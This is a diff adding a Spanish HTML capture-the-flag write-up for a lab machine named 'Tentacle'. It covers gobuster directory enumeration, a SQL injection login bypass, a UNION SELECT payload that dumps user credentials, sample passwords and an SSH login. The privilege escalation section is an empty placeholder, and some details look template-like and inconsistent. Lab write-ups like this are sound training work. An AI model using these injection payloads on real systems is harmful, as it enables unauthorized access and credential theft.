@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tentacle - Hacking Vault</title>
+    <link rel="stylesheet" href="../assets/writeup.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="writeup-container">
+        <!-- Encabezado con metadatos -->
+        <div class="writeup-header">
+            <h1><i class="fas fa-skull"></i> Tentacle</h1>
+            <div class="machine-meta">
+                <span class="meta-item"><i class="fas fa-network-wired"></i> 10.10.10.224</span>
+                <span class="meta-item os linux"><i class="fab fa-linux"></i> Linux</span>
+                <span class="meta-item difficulty hard"><i class="fas fa-bolt"></i> Difícil</span>
+            </div>
+        </div>
+
+        <!-- Sección de Enumeración -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-search"></i> Enumeración Web</h2>
+            
+            <div class="finding">
+                <h3>Puerto 80 - Servicio HTTP</h3>
+                <div class="discovery-box">
+                    <h4>Características detectadas:</h4>
+                    <ul class="findings-list">
+                        <li>Servidor Apache 2.4.41</li>
+                        <li>Soporte para PHP 7.4.3</li>
+                        <li>Posible compatibilidad con aplicaciones Android</li>
+                    </ul>
+                </div>
+                
+                <!-- Comando con botón de copiar -->
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>gobuster dir -u http://10.10.10.224 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html</code>
+                </div>
+                
+                <!-- Hallazgos importantes -->
+                <div class="discovery-box">
+                    <h4><i class="fas fa-folder-open"></i> Hallazgos importantes:</h4>
+                    <ul>
+                        <li><strong>/admin</strong> - Panel de login con posible vulnerabilidad SQLi</li>
+                        <li><strong>/backup</strong> - Archivo config.bak expuesto con credenciales</li>
+                    </ul>
+                </div>
+                
+                <!-- Imagen de ejemplo -->
+                <div class="image-box">
+                    <img src="../images/tentacle-admin-panel.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 1: Panel de administración vulnerable</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección de Explotación -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-bug"></i> Explotación</h2>
+            
+            <div class="exploit-step">
+                <h3>SQL Injection en panel de administración</h3>
+                
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>admin' OR 1=1-- -</code>
+                </div>
+                
+                <p>Este payload nos permite bypassear el login sin credenciales válidas.</p>
+                
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>UNION SELECT 1,group_concat(username,':',password),3,4 FROM users-- -</code>
+                </div>
+                
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Credenciales obtenidas:</h4>
+                    <ul>
+                        <li><strong>admin:7a8b9c0d1e2f3g4h5i6j</strong></li>
+                        <li><strong>backup:backup123!</strong></li>
+                    </ul>
+                </div>
+                
+                <h3>Acceso SSH</h3>
+                
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>ssh user@10.10.10.224</code>
+                </div>
+                
+                <div class="image-box">
+                    <img src="../images/tentacle-ssh-access.png" alt="Acceso SSH a Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 2: Sesión SSH establecida</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección de Escalada de Privilegios -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-user-shield"></i> Escalada de Privilegios</h2>
+            <!-- Contenido de escalada... -->
+        </section>
+    </div>
+
+    <script src="../assets/scripts/copy.js" defer></script>
+</body>
+</html>
